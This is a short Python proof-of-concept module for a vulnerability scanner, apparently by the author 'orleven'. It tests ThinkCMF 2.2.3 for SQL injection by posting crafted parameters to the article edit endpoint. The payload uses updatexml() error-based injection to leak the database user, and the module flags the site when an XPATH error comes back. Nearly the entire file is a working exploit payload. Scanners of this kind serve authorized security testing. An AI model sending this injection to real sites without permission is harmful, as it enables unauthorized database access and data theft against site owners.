#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'thinkcmf 2.2.3 sql'
        self.keyword = ['thinkcmf', 'php']
        self.info = 'thinkcmf 2.2.3 sql'
        self.type = 'sql'
        self.level = 'high'
        self.refer = 'https://xz.aliyun.com/t/3529'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            for path in path_list:
                url = path + "/index.php?g=Portal&m=Article&a=edit_post"
                _data = 'term=123&post[post_title]=123&post[post_title]=aaa&post_title=123&post[id][0]=bind&post[id][1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))'
                res = self.curl('post', url,data = _data)
                if res != None and ':XPATH' in res.text:
                    self.flag = 1
                    self.req.append({"flag": url})
